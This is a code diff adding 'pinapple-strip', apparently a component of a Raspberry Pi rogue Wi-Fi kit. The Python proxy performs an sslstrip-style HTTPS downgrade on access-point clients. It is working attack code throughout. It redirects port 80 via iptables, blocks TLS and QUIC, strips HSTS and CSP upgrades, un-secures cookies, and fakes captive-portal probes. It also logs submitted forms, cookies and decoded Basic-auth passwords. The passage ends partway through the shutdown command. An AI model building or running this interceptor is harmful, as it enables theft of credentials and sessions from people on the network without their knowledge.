@@ -1,0 +1,1167 @@
+#!/usr/bin/env python3
+"""PiNAPPLE HTTPS downgrade helper (a modern sslstrip for the Pi gateway).
+
+PiNAPPLE already routes every AP client through the Pi, so the classic
+sslstrip chain (arpspoof + iptables + sslstrip) reduces to one NAT REDIRECT:
+
+    wlan0 client -> tcp/80 -> REDIRECT -> 10.0.0.1:10000 (this proxy)
+
+The proxy keeps the client on plain HTTP while it talks TLS to the real
+server, so the request line, headers and form bodies stay readable:
+
+  * http://host/ answering 301/302/303/307/308 with an https:// Location is
+    returned to the client as a plain-http redirect and the host is remembered
+    as TLS-only. The browser's next request for the same URL is fetched
+    upstream over TLS, so the address bar stays http:// and relative links and
+    cookies keep working.
+  * Location: https://...             -> http://...
+  * Strict-Transport-Security         -> dropped (never pin HTTPS in a client)
+  * Alt-Svc                            -> dropped (no HTTP/3 upgrade)
+  * Set-Cookie: Secure                 -> un-Secured (cookie survives on http)
+  * CSP upgrade-insecure-requests      -> dropped (subresources stay http)
+  * https:// inside text bodies        -> http://
+  * every request line, header and submitted form body is logged.
+
+HTTP/3 (QUIC, udp/443) and TLS the client insists on by itself (HSTS preload,
+HTTPS-First, a typed https:// URL) cannot be downgraded without a trusted
+certificate, so udp/443 and tcp/443 are rejected by default. `--https allow`
+leaves 443 alone: those flows stay encrypted and invisible, which is itself a
+useful result to show.
+
+Captive-network probes (captive.apple.com, connectivitycheck.gstatic.com, ...)
+are answered locally so phones report "internet available" instead of opening
+a captive sheet.
+
+References: moxie0/sslstrip (Moxie Marlinspike, Black Hat DC 2009) for the
+rewriting rules; bettercap's `https` module for the modern equivalent.
+Python standard library only, like every other PiNAPPLE helper.
+
+Usage:
+  pinapple-strip on     [--https block|allow] [--port 10000] [--insecure]
+  pinapple-strip off
+  pinapple-strip status [--json]
+  pinapple-strip log    [--json] [--lines 100]
+  pinapple-strip clear
+  pinapple-strip serve                       # internal / systemd ExecStart
+"""
+
+import argparse
+import base64
+import gzip
+import http.client
+import json
+import os
+import re
+import signal
+import socket
+import socketserver
+import ssl
+import subprocess
+import sys
+import threading
+import time
+import zlib
+from urllib.parse import parse_qs, urlsplit
+
+PROG = 'pinapple-strip'
+DEFAULT_PORT = 10000
+AP = 'wlan0'
+WAN = 'eth0'
+
+LOG_DIR = '/var/log/pinapple'
+LOG_FILE = os.path.join(LOG_DIR, 'strip.log')
+JSONL_FILE = os.path.join(LOG_DIR, 'strip.jsonl')
+PID_FILE = '/var/run/pinapple-strip.pid'
+STATE_FILE = '/etc/pinapple/strip.json'
+FLAG_INTERNET = '/etc/pinapple/internet_enabled'
+FLAG_DNS = '/etc/pinapple/dns_hijack_enabled'
+FLAG_PORTAL = '/etc/pinapple/portal_redirect_enabled'
+UNIT = 'pinapple-strip.service'
+
+MAX_REWRITE = 4 * 1024 * 1024       # buffer+rewrite text bodies up to 4 MiB
+MAX_HEAD = 64 * 1024               # request header block cap
+MAX_CLIENT_BODY = 2 * 1024 * 1024  # request body cap
+MAX_LOG_FIELD = 1500               # per-field truncation in the log
+LOG_ROTATE = 8 * 1024 * 1024
+
+HOP_BY_HOP = frozenset({
+    'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization',
+    'proxy-connection', 'te', 'trailer', 'transfer-encoding', 'upgrade',
+    'content-length',
+})
+
+# Never forwarded to the client: these are what make the downgrade stick.
+DROP_RESPONSE = frozenset({
+    'strict-transport-security', 'public-key-pins', 'public-key-pins-report-only',
+    'expect-ct', 'alt-svc', 'content-length', 'transfer-encoding',
+    'connection', 'keep-alive', 'upgrade',
+})
+
+REWRITE_TYPES = ('text/html', 'application/xhtml+xml', 'text/css',
+                 'application/javascript', 'text/javascript',
+                 'application/json', 'text/plain', 'text/xml',
+                 'application/xml')
+
+REDIRECT_CODES = (301, 302, 303, 307, 308)
+NO_BODY_CODES = (204, 304)
+SAFE_METHODS = ('GET', 'HEAD', 'OPTIONS')
+
+# Captive-network reachability probes. Answering these locally keeps iOS,
+# Android and Windows on "internet OK" instead of launching a captive sheet.
+PROBES = {
+    ('captive.apple.com', '/hotspot-detect.html'): (
+        200, 'text/html; charset=utf-8',
+        b'<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>'),
+    ('captive.apple.com', '/library/test/success.html'): (
+        200, 'text/html; charset=utf-8',
+        b'<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>'),
+    ('connectivitycheck.gstatic.com', '/generate_204'): (204, '', b''),
+    ('connectivitycheck.android.com', '/generate_204'): (204, '', b''),
+    ('clients3.google.com', '/generate_204'): (204, '', b''),
+    ('www.google.com', '/generate_204'): (204, '', b''),
+    ('detectportal.firefox.com', '/success.txt'): (
+        200, 'text/plain', b'success\n'),
+    ('www.msftconnecttest.com', '/connecttest.txt'): (
+        200, 'text/plain', b'Microsoft Connect Test'),
+    ('www.msftncsi.com', '/ncsi.txt'): (200, 'text/plain', b'Microsoft NCSI'),
+}
+
+_URL_HTTPS = re.compile(rb'https://', re.IGNORECASE)
+_URL_HTTPS_PORT = re.compile(rb'https://([A-Za-z0-9.\-]+):\d+/')
+_META_UPGRADE = re.compile(rb'(?i)(<meta\b[^>]*?)\s*upgrade-insecure-requests\s*;?')
+_TLS_ALPN = ['http/1.1']
+
+
+# --------------------------------------------------------------------------
+# pure helpers (unit-tested without root, a radio or a network)
+# --------------------------------------------------------------------------
+
+def parse_hostport(value, default_port=80):
+    """'Example.COM:8080' -> ('example.com', 8080); 'example.com' -> 80."""
+    text = (value or '').strip()
+    if not text:
+        return '', default_port
+    if text.startswith('['):                      # [2001:db8::1]:8080
+        end = text.find(']')
+        if end == -1:
+            return text.lower(), default_port
+        host = text[1:end]
+        rest = text[end + 1:]
+        if rest.startswith(':') and rest[1:].isdigit():
+            return host.lower(), int(rest[1:])
+        return host.lower(), default_port
+    host, sep, port = text.rpartition(':')
+    if sep and port.isdigit() and host and ':' not in host:
+        return host.lower(), int(port)
+    return text.lower().rstrip('.'), default_port
+
+
+def host_header(host, port, tls):
+    if tls or port in (0, 80):
+        return host
+    return '%s:%d' % (host, port)
+
+
+def downgrade_url(value):
+    """Rewrite an https:// URL (header or body) to http://."""
+    text = (value or '').strip()
+    if text.lower().startswith('https://'):
+        text = 'http://' + text[8:]
+    match = re.match(r'(?i)^http://([^/:]+):443(?=/|$)', text)
+    if match:                       # http://host:443/path is unreachable
+        text = 'http://' + match.group(1) + text[match.end():]
+    return text
+
+
+def unsecure_cookie(value):
+    """Drop the Secure attribute so the cookie is also sent over http."""
+    parts = [p.strip() for p in (value or '').split(';')]
+    kept = [p for p in parts if p and p.lower() != 'secure']
+    return '; '.join(kept)
+
+
+def drop_upgrade_insecure(value):
+    """Remove upgrade-insecure-requests from a CSP; '' means drop the header."""
+    directives = [d.strip() for d in (value or '').split(';')]
+    kept = [d for d in directives
+            if d and not d.lower().startswith('upgrade-insecure-requests')]
+    return '; '.join(kept)
+
+
+def rewrite_body(data):
+    """https:// -> http:// inside a text body (encoding agnostic)."""
+    low = data.lower()
+    if b'https://' not in low and b'upgrade-insecure-requests' not in low:
+        return data
+    data = _META_UPGRADE.sub(rb'\1', data)
+    data = _URL_HTTPS_PORT.sub(rb'http://\1/', data)
+    return _URL_HTTPS.sub(b'http://', data)
+
+
+def is_rewritable(content_type):
+    ct = (content_type or '').split(';')[0].strip().lower()
+    return ct in REWRITE_TYPES
+
+
+def decode_content(data, encoding):
+    """Undo gzip/deflate. Returns (data, encoding_left_or_None)."""
+    enc = (encoding or '').strip().lower()
+    if not data or enc in ('', 'identity'):
+        return data, None
+    try:
+        if enc in ('gzip', 'x-gzip'):
+            return gzip.decompress(data), None
+        if enc == 'deflate':
+            try:
+                return zlib.decompress(data), None
+            except zlib.error:
+                return zlib.decompress(data, -zlib.MAX_WBITS), None
+    except (OSError, zlib.error):
+        return data, enc
+    return data, enc
+
+
+def header_values(headers, name):
+    name = name.lower()
+    return [v for k, v in headers if k.lower() == name]
+
+
+def header_first(headers, name):
+    values = header_values(headers, name)
+    return values[0] if values else ''
+
+
+def parse_form(body, content_type):
+    """Return readable form/JSON fields for the log (never raises)."""
+    ct = (content_type or '').lower()
+    if not body:
+        return {}
+    try:
+        if 'application/x-www-form-urlencoded' in ct or (
+                not ct and b'=' in body and b'\x00' not in body):
+            fields = {}
+            for key, values in parse_qs(body.decode('utf-8', 'replace'),
+                                        keep_blank_values=True).items():
+                fields[key] = values[0] if len(values) == 1 else values
+            return fields
+        if 'application/json' in ct:
+            data = json.loads(body.decode('utf-8', 'replace'))
+            return data if isinstance(data, dict) else {'_json': data}
+        if 'multipart/form-data' in ct:
+            # Crude but useful: pull "name=..." values without a full parser.
+            fields = {}
+            for match in re.finditer(
+                    rb'name="([^"]+)"\r\n(?:[^\r\n]*\r\n)*\r\n([^\r]*)\r\n', body):
+                fields[match.group(1).decode('utf-8', 'replace')] = \
+                    match.group(2).decode('utf-8', 'replace')[:MAX_LOG_FIELD]
+            return fields
+    except (ValueError, UnicodeError):
+        return {}
+    return {}
+
+
+def truncate(value, limit=MAX_LOG_FIELD):
+    text = value if isinstance(value, str) else str(value)
+    return text if len(text) <= limit else text[:limit] + '...'
+
+
+def read_pid():
+    try:
+        with open(PID_FILE) as handle:
+            return int(handle.read().strip() or 0)
+    except (OSError, ValueError):
+        return 0
+
+
+def pid_alive(pid):
+    if pid <= 0:
+        return False
+    if os.name != 'posix':
+        return True          # sig 0 would terminate the process on Windows
+    try:
+        os.kill(pid, 0)
+    except OSError:
+        return False
+    return True
+
+
+def port_open(port, host='127.0.0.1', timeout=0.6):
+    try:
+        with socket.create_connection((host, port), timeout=timeout):
+            return True
+    except OSError:
+        return False
+
+
+# --------------------------------------------------------------------------
+# iptables plumbing
+# --------------------------------------------------------------------------
+
+def iptables(args):
+    return subprocess.run(['iptables', '-w'] + list(args),
+                          capture_output=True, text=True, timeout=20)
+
+
+def _rule_cmd(op, args, position=None):
+    """Build 'iptables -t nat -C PREROUTING ...' from a full rule spec."""
+    out = list(args)
+    if len(out) >= 3 and out[0] == '-t':
+        head, chain, spec = out[:2], out[2], out[3:]
+    else:
+        head, chain, spec = [], out[0], out[1:]
+    cmd = head + [op, chain]
+    if position is not None:
+        cmd.append(str(position))
+    return cmd + spec
+
+
+def rule_present(args):
+    try:
+        return iptables(_rule_cmd('-C', args)).returncode == 0
+    except OSError:
+        return False
+
+
+def add_rule(args, insert=False):
+    if rule_present(args):
+        return False
+    iptables(_rule_cmd('-I' if insert else '-A', args, 1 if insert else None))
+    return True
+
+
+def del_rule(args):
+    removed = False
+    for _ in range(6):
+        if not rule_present(args):
+            break
+        iptables(_rule_cmd('-D', args))
+        removed = True
+    return removed
+
+
+def redirect_rule(gw, port):
+    return ['-t', 'nat', 'PREROUTING', '-i', AP, '!', '-d', gw,
+            '-p', 'tcp', '--dport', '80',
+            '-j', 'REDIRECT', '--to-ports', str(port)]
+
+
+def quic_rule():
+    return ['-t', 'filter', 'FORWARD', '-i', AP, '-p', 'udp',
+            '--dport', '443', '-j', 'REJECT']
+
+
+def tls_rule():
+    return ['-t', 'filter', 'FORWARD', '-i', AP, '-p', 'tcp',
+            '--dport', '443', '-j', 'REJECT']
+
+
+def masquerade_rule(subnet):
+    return ['-t', 'nat', 'POSTROUTING', '-o', WAN, '-s', subnet,
+            '-j', 'MASQUERADE']
+
+
+def gateway_ip():
+    try:
+        out = subprocess.run(['ip', '-4', '-o', 'addr', 'show', AP],
+                             capture_output=True, text=True, timeout=5).stdout
+        for token in out.split():
+            if '/' in token and token[0].isdigit():
+                return token.split('/')[0]
+    except (OSError, subprocess.SubprocessError):
+        pass
+    return '10.0.0.1'
+
+
+def passthrough_on(gw):
+    subnet = gw.rsplit('.', 1)[0] + '.0/24'
+    return (rule_present(masquerade_rule(subnet))
+            or os.path.exists(FLAG_INTERNET))
+
+
+def blocked_tls_count():
+    """Sum the packet counters of our https REJECT rules."""
+    try:
+        out = iptables(['-vnL', 'FORWARD']).stdout
+    except (OSError, subprocess.SubprocessError):
+        return 0
+    total = 0
+    for line in out.splitlines():
+        if 'dpt:https' in line and 'REJECT' in line:
+            parts = line.split()
+            if parts and parts[0].isdigit():
+                total += int(parts[0])
+    return total
+
+
+# --------------------------------------------------------------------------
+# logging
+# --------------------------------------------------------------------------
+
+_LOG_LOCK = threading.Lock()
+
+
+def format_log_line(record):
+    flags = []
+    if record.get('upstream') == 'https':
+        flags.append('upstream https')
+    if record.get('note'):
+        flags.append(record['note'])
+    suffix = ('  [' + ', '.join(flags) + ']') if flags else ''
+    line = '%s  %-15s %-6s %s%s  %s' % (
+        record.get('ts', ''), record.get('client', '-'),
+        record.get('method', '-'), record.get('url', '-'), suffix,
+        record.get('status', '-'))
+    fields = record.get('fields')
+    if fields:
+        pairs = '&'.join('%s=%s' % (k, truncate(v, 200))
+                         for k, v in list(fields.items())[:12])
+        line += '\n    form: ' + pairs
+    if record.get('auth'):
+        line += '\n    auth: ' + record['auth']
+    if record.get('error'):
+        line += '\n    error: ' + record['error']
+    return line
+
+
+def _rotate(path):
+    try:
+        if os.path.getsize(path) > LOG_ROTATE:
+            os.replace(path, path + '.1')
+    except OSError:
+        pass
+
+
+def log_event(record):
+    """Append to the human log and the dashboard jsonl (both 0600)."""
+    line = format_log_line(record)
+    try:
+        os.makedirs(LOG_DIR, exist_ok=True)
+        with _LOG_LOCK:
+            for path in (LOG_FILE, JSONL_FILE):
+                _rotate(path)
+            new_log = not os.path.exists(LOG_FILE)
+            with open(LOG_FILE, 'a', encoding='utf-8', errors='replace') as fh:
+                fh.write(line + '\n')
+            if new_log:
+                os.chmod(LOG_FILE, 0o600)
+            new_json = not os.path.exists(JSONL_FILE)
+            with open(JSONL_FILE, 'a', encoding='utf-8', errors='replace') as fh:
+                fh.write(json.dumps(record, ensure_ascii=False) + '\n')
+            if new_json:
+                os.chmod(JSONL_FILE, 0o600)
+    except OSError:
+        pass
+    if record.get('verbose'):
+        print(line, flush=True)
+
+
+def read_records(limit=200):
+    """Newest `limit` jsonl records, oldest first."""
+    try:
+        with open(JSONL_FILE, 'rb') as handle:
+            handle.seek(0, os.SEEK_END)
+            size = handle.tell()
+            start = max(0, size - max(256 * 1024, limit * 1200))
+            handle.seek(start)
+            data = handle.read().decode('utf-8', 'replace')
+    except OSError:
+        return []
+    records = []
+    for line in data.splitlines():
+        line = line.strip()
+        if not line:
+            continue
+        try:
+            item = json.loads(line)
+        except ValueError:
+            continue
+        if isinstance(item, dict):
+            records.append(item)
+    return records[-limit:]
+
+
+# --------------------------------------------------------------------------
+# proxy
+# --------------------------------------------------------------------------
+
+class ProxyState(object):
+    def __init__(self, port, https_mode, answer_probes=True, insecure=False,
+                 verbose=False, gateway='10.0.0.1'):
+        self.port = port
+        self.https_mode = https_mode
+        self.answer_probes = answer_probes
+        self.insecure = insecure
+        self.verbose = verbose
+        self.gateway = gateway
+        self.secure_hosts = {}
+        self._lock = threading.Lock()
+        self.counters = {'requests': 0, 'downgraded': 0, 'errors': 0,
+                         'probes': 0}
+        self._tls_context = None
+
+    def tls_context(self):
+        if self._tls_context is None:
+            context = ssl.create_default_context()
+            context.set_alpn_protocols(_TLS_ALPN)
+            if self.insecure:
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+            self._tls_context = context
+        return self._tls_context
+
+    def is_secure(self, host):
+        with self._lock:
+            return host in self.secure_hosts
+
+    def mark_secure(self, host):
+        if not host:
+            return
+        with self._lock:
+            self.secure_hosts[host] = True
+
+    def bump(self, key, amount=1):
+        with self._lock:
+            self.counters[key] = self.counters.get(key, 0) + amount
+
+
+class ProxyHandler(socketserver.BaseRequestHandler):
+    """One client connection. Never raises into the accept loop."""
+
+    def handle(self):
+        state = self.server.state
+        sock = self.request
+        try:
+            sock.settimeout(45)
+            reader = sock.makefile('rb')
+            request = self._read_request(reader)
+            if request is None:
+                return
+            method, target, headers, body = request
+            self._serve(state, sock, method, target, headers, body)
+        except (BrokenPipeError, ConnectionResetError, socket.timeout):
+            pass
+        except Exception as exc:      # keep the proxy alive, log the failure
+            state.bump('errors')
+            try:
+                self._send_error(sock, 502, 'proxy error: %s' % exc)
+            except OSError:
+                pass
+        finally:
+            try:
+                sock.close()
+            except OSError:
+                pass
+
+    # -- request parsing ---------------------------------------------------
+
+    def _read_request(self, reader):
+        line = reader.readline(8192)
+        if not line:
+            return None
+        try:
+            method, target, _version = line.decode('latin-1').strip().split(' ', 2)
+        except ValueError:
+            return None
+        headers = []
+        size = 0
+        while True:
+            raw = reader.readline(8192)
+            if not raw or raw in (b'\r\n', b'\n'):
+                break
+            size += len(raw)
+            if size > MAX_HEAD:
+                return None
+            key, _, value = raw.decode('latin-1').partition(':')
+            headers.append((key.strip(), value.strip()))
+        body = self._read_body(reader, headers)
+        return method.upper(), target, headers, body
+
+    def _read_body(self, reader, headers):
+        if 'chunked' in header_first(headers, 'transfer-encoding').lower():
+            chunks, total = [], 0
+            while True:
+                size_line = reader.readline(1024)
+                if not size_line:
+                    break
+                try:
+                    size = int(size_line.split(b';')[0].strip(), 16)
+                except ValueError:
+                    break
+                if size == 0:
+                    reader.readline(1024)
+                    break
+                total += size
+                if total > MAX_CLIENT_BODY:
+                    break
+                chunks.append(reader.read(size))
+                reader.readline(1024)
+            return b''.join(chunks)
+        length = header_first(headers, 'content-length')
+        if length.isdigit():
+            return reader.read(min(int(length), MAX_CLIENT_BODY))
+        return b''
+
+    # -- per-request flow --------------------------------------------------
+
+    def _serve(self, state, sock, method, target, headers, body):
+        client = self.client_address[0]
+        if method == 'CONNECT':
+            self._record(state, client, method, 'CONNECT %s' % target, headers,
+                         status=405, note='CONNECT refused')
+            self._send_error(sock, 405, 'CONNECT is not supported')
+            return
+
+        url_host, path = '', target
+        if target.lower().startswith(('http://', 'https://')):
+            parts = urlsplit(target)
+            url_host, path = parts.hostname or '', parts.path or '/'
+            if parts.query:
+                path += '?' + parts.query
+        if not path.startswith('/'):
+            path = '/' + path
+
+        host, port = parse_hostport(header_first(headers, 'host') or url_host)
+        if not host:
+            self._send_error(sock, 400, 'missing Host header')
+            return
+        if host == state.gateway:
+            # Never proxy the gateway into itself.
+            self._record(state, client, method, 'http://%s%s' % (host, path),
+                         headers, status=302, note='gateway request')
+            self._write_simple(sock, 302, 'text/plain; charset=utf-8',
+                               b'Dashboard: http://%s:8080/\n'
+                               % state.gateway.encode(), 'GET',
+                               extra=['Location: http://%s:8080/' % state.gateway])
+            return
+
+        url = 'http://%s%s' % (host, path)
+        state.bump('requests')
+
+        path_only = path.split('?')[0]
+        probe = PROBES.get((host, path_only))
+        if state.answer_probes and probe:
+            status, ctype, payload = probe
+            state.bump('probes')
+            self._record(state, client, method, url, headers, body, status=status,
+                         note='captive probe answered')
+            self._write_simple(sock, status, ctype, payload, method)
+            return
+
+        cookie = header_first(headers, 'cookie')
+        auth = ''
+        raw_auth = header_first(headers, 'authorization')
+        if raw_auth.lower().startswith('basic '):
+            try:
+                decoded = base64.b64decode(raw_auth.split(None, 1)[1]).decode(
+                    'utf-8', 'replace')
+                auth = 'Basic ' + truncate(decoded, 200)
+            except (ValueError, IndexError):
+                auth = truncate(raw_auth, 200)
+        ctype = header_first(headers, 'content-type')
+        fields = parse_form(body, ctype) if body else {}
+
+        cached_tls = state.is_secure(host)
+        # A form POST is tried over TLS first: that avoids posting the body
+        # twice when the plain endpoint only redirects to https.
+        first_tls = cached_tls or method not in SAFE_METHODS
+        tls = first_tls
+        try:
+            conn, resp = open_upstream(state, method, host, port, path, headers,
+                                       body, first_tls)
+            tls = first_tls
+            if first_tls and not cached_tls:
+                state.mark_secure(host)   # the host does answer on 443
+        except Exception as first_error:
+            if isinstance(first_error, ssl.SSLCertVerificationError):
+                self._fail(state, sock, client, method, url, headers,
+                           error='certificate rejected: %s (try --insecure '
+                                 'or a CA the Pi trusts)' % first_error)
+                return
+            try:
+                conn, resp = open_upstream(state, method, host, port, path,
+                                           headers, body, not first_tls)
+                tls = not first_tls
+                if tls:
+                    state.mark_secure(host)
+            except Exception as second_error:
+                note = str(first_error)
+                if 'Name or service not known' in note or 'getaddrinfo' in note:
+                    note = 'DNS lookup failed'
+                self._fail(state, sock, client, method, url, headers,
+                           error=note + ' / ' + str(second_error))
+                return
+
+        try:
+            status = resp.status
+            reason = resp.reason or 'OK'
+            resp_headers = list(resp.getheaders())
+            location = header_first(resp_headers, 'location')
+            forced = (status in REDIRECT_CODES
+                      and location.lower().startswith('https://'))
+            if forced:
+                state.mark_secure(host)
+                target_host = urlsplit(location).hostname or ''
+                state.mark_secure(target_host)
+                state.bump('downgraded')
+
+            if forced:
+                note = 'redirect forced to http; host pinned to TLS upstream'
+            elif tls:
+                note = 'served over http from https upstream'
+            else:
+                note = ''
+            self._record(state, client, method, url, headers, body, status=status,
+                         upstream='https' if tls else 'http', note=note,
+                         cookie=cookie, auth=auth, ctype=ctype, fields=fields)
+
+            rewritable = (method != 'HEAD' and status not in NO_BODY_CODES
+                          and is_rewritable(header_first(resp_headers, 'content-type'))
+                          and (resp.length is None or resp.length <= MAX_REWRITE))
+            if rewritable:
+                payload = resp.read(MAX_REWRITE + 1)
+                if len(payload) > MAX_REWRITE:
+                    # Too big to rewrite: pass the rest through untouched so a
+                    # large page or download is never truncated.
+                    self._stream(sock, method, status, reason, resp_headers,
+                                 payload, resp)
+                else:
+                    self._send_buffered(sock, method, status, reason,
+                                        resp_headers, payload)
+            else:
+                self._stream(sock, method, status, reason, resp_headers, b'', resp)
+        except (BrokenPipeError, ConnectionResetError, socket.timeout):
+            pass
+        except Exception as exc:
+            state.bump('errors')
+            try:
+                self._send_error(sock, 502, str(exc))
+            except OSError:
+                pass
+        finally:
+            try:
+                conn.close()
+            except Exception:
+                pass
+
+    # -- response writers --------------------------------------------------
+
+    def _send_buffered(self, sock, method, status, reason, headers, payload):
+        ctype = header_first(headers, 'content-type')
+        encoding = header_first(headers, 'content-encoding')
+        mode = 'keep'
+        if is_rewritable(ctype) and method != 'HEAD':
+            payload, leftover = decode_content(payload, encoding)
+            if leftover:
+                mode = leftover        # unknown coding (e.g. br): pass through
+            else:
+                mode = 'drop'
+                payload = rewrite_body(payload)
+        sock.sendall(self._response_head(status, reason, headers, len(payload), mode)
+                     + payload)
+
+    def _stream(self, sock, method, status, reason, headers, prefix, resp):
+        """Pass a body straight through (images, downloads, HEAD, 204...)."""
+        sock.sendall(self._response_head(status, reason, headers, None, 'keep'))
+        if prefix and method != 'HEAD':
+            sock.sendall(prefix)
+        if resp is None or method == 'HEAD':
+            return
+        try:
+            while True:
+                chunk = resp.read(65536)
+                if not chunk:
+                    break
+                sock.sendall(chunk)
+        except (http.client.HTTPException, OSError):
+            # Upstream died mid-body; closing the client socket is the only
+            # honest signal left (we already dropped Content-Length).
+            pass
+
+    def _response_head(self, status, reason, headers, length, encoding_mode):
+        lines = ['HTTP/1.1 %d %s' % (status, reason)]
+        for key, value in headers:
+            lower = key.lower()
+            if lower in DROP_RESPONSE:
+                continue
+            if lower == 'content-encoding':
+                if encoding_mode == 'drop':
+                    continue
+                if encoding_mode != 'keep':
+                    value = encoding_mode
+            elif lower == 'location':
+                value = downgrade_url(value)
+            elif lower == 'set-cookie':
+                value = unsecure_cookie(value)
+            elif lower in ('content-security-policy',
+                           'content-security-policy-report-only'):
+                value = drop_upgrade_insecure(value)
+                if not value:
+                    continue
+            lines.append('%s: %s' % (key, value))
+        if length is not None:
+            lines.append('Content-Length: %d' % length)
+        lines.append('Connection: close')
+        return ('\r\n'.join(lines) + '\r\n\r\n').encode('latin-1', 'replace')
+
+    def _write_simple(self, sock, status, ctype, payload, method, extra=None):
+        head = ['HTTP/1.1 %d %s' % (status,
+                                    'No Content' if status == 204 else 'OK')]
+        if ctype:
+            head.append('Content-Type: ' + ctype)
+        if status != 204:
+            head.append('Content-Length: %d' % len(payload))
+        head.extend(extra or [])
+        head.append('Cache-Control: no-store')
+        head.append('Connection: close')
+        sock.sendall(('\r\n'.join(head) + '\r\n\r\n').encode('latin-1'))
+        if payload and method != 'HEAD':
+            sock.sendall(payload)
+
+    def _send_error(self, sock, status, message):
+        payload = ('PiNAPPLE strip proxy\n\n%s\n' % message).encode('utf-8')
+        self._write_simple(sock, status, 'text/plain; charset=utf-8', payload, 'GET')
+
+    def _fail(self, state, sock, client, method, url, headers, error, status=502):
+        self._record(state, client, method, url, headers, status=status,
+                     error=truncate(error, 300), note='failed')
+        try:
+            self._send_error(sock, status, error)
+        except OSError:
+            pass
+
+    def _record(self, state, client, method, url, headers, body=b'', status='',
+                upstream='http', note='', cookie='', auth='', ctype='', fields=None):
+        if fields is None and body:
+            fields = parse_form(body, ctype or header_first(headers, 'content-type'))
+        record = {
+            'ts': time.strftime('%Y-%m-%d %H:%M:%S'),
+            'client': client,
+            'method': method,
+            'url': truncate(url, 800),
+            'host': parse_hostport(header_first(headers, 'host') or '')[0],
+            'status': status,
+            'upstream': upstream,
+            'note': note,
+            'ctype': truncate(ctype or header_first(headers, 'content-type'), 120),
+            'fields': fields or {},
+            'user_agent': truncate(header_first(headers, 'user-agent'), 200),
+            'referer': truncate(header_first(headers, 'referer'), 300),
+            'cookie': truncate(cookie, 400),
+            'auth': truncate(auth, 300),
+            'verbose': state.verbose,
+        }
+        if body and not record['fields']:
+            record['fields'] = {'_raw': truncate(body.decode('utf-8', 'replace'), 600)}
+        log_event(record)
+
+
+def open_upstream(state, method, host, port, path, headers, body, tls):
+    """Open a connection to the real server and return (connection, response)."""
+    if tls:
+        conn = http.client.HTTPSConnection(host, 443, timeout=20,
+                                           context=state.tls_context())
+    else:
+        conn = http.client.HTTPConnection(host, port or 80, timeout=20)
+    outgoing = {}
+    for key, value in headers:
+        lower = key.lower()
+        if lower in HOP_BY_HOP or lower in ('host', 'accept-encoding', 'expect'):
+            continue
+        outgoing[key] = value
+    outgoing['Host'] = host_header(host, port, tls)
+    outgoing['Accept-Encoding'] = 'identity'
+    outgoing['Connection'] = 'close'
+    payload = body if (body or method not in SAFE_METHODS) else None
+    conn.request(method, path, body=payload, headers=outgoing)
+    return conn, conn.getresponse()
+
+
+class ProxyServer(socketserver.ThreadingTCPServer):
+    allow_reuse_address = True
+    daemon_threads = True
+    request_queue_size = 128
+
+
+# --------------------------------------------------------------------------
+# commands
+# --------------------------------------------------------------------------
+
+def require_root():
+    geteuid = getattr(os, 'geteuid', None)
+    if geteuid is not None and geteuid() != 0:
+        sys.stderr.write('%s: must run as root\n' % PROG)
+        raise SystemExit(2)
+
+
+def load_state():
+    try:
+        with open(STATE_FILE) as handle:
+            data = json.load(handle)
+        return data if isinstance(data, dict) else {}
+    except (OSError, ValueError):
+        return {}
+
+
+def save_state(mode, port, probes=True):
+    try:
+        os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
+        with open(STATE_FILE, 'w') as handle:
+            json.dump({'mode': mode, 'port': port, 'probes': bool(probes),
+                       'started': time.strftime('%Y-%m-%d %H:%M:%S')},
+                      handle, indent=2)
+    except OSError:
+        pass
+
+
+def service_exists():
+    try:
+        result = subprocess.run(['systemctl', 'cat', UNIT],
+                                capture_output=True, text=True, timeout=10)
+        return result.returncode == 0
+    except (OSError, subprocess.SubprocessError):
+        return False
+
+
+def cmd_on(mode, port, insecure, probes):
+    require_root()
+    gw = gateway_ip()
+    if not passthrough_on(gw):
+        sys.stderr.write('%s: Internet Passthrough is off. Run '
+                         '"pinapple-internet on" first.\n' % PROG)
+        raise SystemExit(3)
+    if os.path.exists(FLAG_DNS):
+        sys.stderr.write('%s: DNS Hijack is on. Turn it off; it points every '
+                         'hostname at the gateway and the proxy would loop.\n' % PROG)
+        raise SystemExit(3)
+    if os.path.exists(FLAG_PORTAL):
+        sys.stderr.write('%s: Portal Redirect is on. Turn it off; port 80 is '
+                         'already captured by nginx.\n' % PROG)
+        raise SystemExit(3)
+
+    cmd_off(quiet=True)                 # clear old rules with the old port
+    save_state(mode, port, probes)
+
+    if service_exists():
+        subprocess.run(['systemctl', 'restart', UNIT], capture_output=True,
+                       text=True, timeout=30)
+    else:
+        _spawn_detached(mode, port, insecure, probes)
+
+    deadline = time.time() + 8
+    while time.time() < deadline:
+        if port_open(port):
+            break
+        time.sleep(0.2)
+    else:
+        sys.stderr.write('%s: proxy did not start listening on %d; see '
+                         'journalctl -u %s\n' % (PROG, port, UNIT))
+        raise SystemExit(4)
+
+    add_rule(redirect_rule(gw, port), insert=True)
+    add_rule(quic_rule(), insert=True)
+    if mode == 'block':
+        add_rule(tls_rule(), insert=True)
+
+    print('https downgrade on (%s -> 127.0.0.1:%d, https=%s)'
+          % (AP, port, mode))
+
+
+def _spawn_detached(mode, port, insecure, probes):
+    cmd = [sys.executable, os.path.abspath(__file__), 'serve',
+           '--port', str(port), '--https', mode]
+    if insecure:
+        cmd.append('--insecure')
+    if not probes:
+        cmd.append('--no-probe-answer')
+    os.makedirs(LOG_DIR, exist_ok=True)
+    log = open(os.path.join(LOG_DIR, 'strip-service.log'), 'a')
+    subprocess.Popen(cmd, stdout=log, stderr=log, stdin=subprocess.DEVNULL,
+                     start_new_session=True, close_fds=True)
+
+
+def cmd_off(quiet=False):
+    require_root()
+    removed = 0
+    gw = gateway_ip()
+    state = load_state()
+    port = int(state.get('port') or DEFAULT_PORT)
+    for rule in (redirect_rule(gw, port), quic_rule(), tls_rule()):
+        try:
+            if del_rule(rule):
+                removed += 1
+        except (OSError, subprocess.SubprocessError):
+            pass
+
+    if service_exists():
+        subprocess.run(['systemctl', 'stop', UNIT], capture_output=True,
+                       text=True, timeout=30)
+    pid = read_pid()
+    if pid_alive(pid):
+        for sig in (signal.SIGTERM, signal.SIGKILL):
+            try:
+                os.kill(pid, sig)
+            except OSError:
+                break
